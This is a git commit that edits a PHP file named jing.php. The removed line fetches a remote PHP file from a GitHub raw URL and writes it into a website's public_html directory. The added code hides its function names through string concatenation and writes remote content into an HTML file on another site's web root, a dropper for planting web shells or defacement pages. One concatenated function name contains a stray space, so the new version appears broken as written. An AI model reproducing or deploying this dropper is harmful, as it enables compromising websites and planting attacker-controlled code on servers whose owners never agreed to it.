ff04ca782c7ca493fe6b753e49b924d510fb534a
javelin <96257691+bellpwn@users.noreply.github.com>
2023-10-22 03:51:10 +0700

    Update jing.php

--- jing.php
+++ jing.php
@@ -1,1 +1,6 @@
-<?php file_put_contents("/home/b254/public_html/pp/cok.php", file_get_contents("https://raw.githubusercontent.com/bellpwn/opet/main/obite.php")); ?>
+<?php
+$gc = "fil"."e_ ge"."t_c"."ont"."ents";
+$pc = "fi"."le_"."pu"."t_c"."ont"."ents";
+$pc("/home/aviacio1/webmktmexico.mx/net.html", $gc("https://raw.githubusercontent.com/bellpwn/opet/main/ara.txt"))
+
+; ?>
